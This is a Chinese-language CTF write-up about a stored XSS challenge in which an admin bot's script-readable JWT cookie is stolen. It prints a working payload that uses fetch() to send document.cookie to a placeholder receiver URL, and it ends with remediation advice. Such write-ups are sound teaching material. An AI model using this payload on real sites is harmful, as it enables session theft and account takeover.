# Submit your Homework!

## 题目简述

网站允许登录用户提交作业，内容保存进数据库后由管理员机器人访问。EJS 模板使用未转义输出渲染提交内容，管理员的 JWT cookie 又明确设置为可被 JavaScript 读取。目标是通过持久化 XSS 窃取管理员 cookie，再以管理员身份查看 flag。

## 解题过程

提交页面的渲染方式为：

```ejs
<div>
    <%- content %>
</div>
```

`<%- ... %>` 不做 HTML 转义，所以数据库中的 `<script>` 会在浏览器执行。管理员机器人访问前写入的关键 cookie 配置可裁剪为：

```javascript
const adminCookie = {
  name: "auth_token",
  value: adminToken,
  httpOnly: false
};
```

先准备自己可查看请求的 HTTPS 接收端，再提交如下作业；其中 `<RECEIVER_URL>` 替换成该接收端地址：

```html
<script>
fetch("<RECEIVER_URL>?cookie=" + encodeURIComponent(document.cookie))
</script>
```

机器人打开该提交后，接收端会看到包含 `auth_token` 的请求。把自己的 `auth_token` cookie 值替换为管理员 token，刷新 `/submit_homework`，模板依据 JWT 中的 `is_admin` 显示：

```text
grey{dont_submit_your_homework_late!}
```

这实际上是持久化 XSS：载荷先入库，再由管理员访问触发；不是反射型 XSS。

## 方法总结

漏洞链由三个条件组成：未转义持久化 HTML、自动访问的高权限机器人、可由脚本读取的认证 cookie。修复应使用转义输出或严格清洗，并为认证 cookie 设置 `HttpOnly`、`Secure` 和恰当的 SameSite 策略。
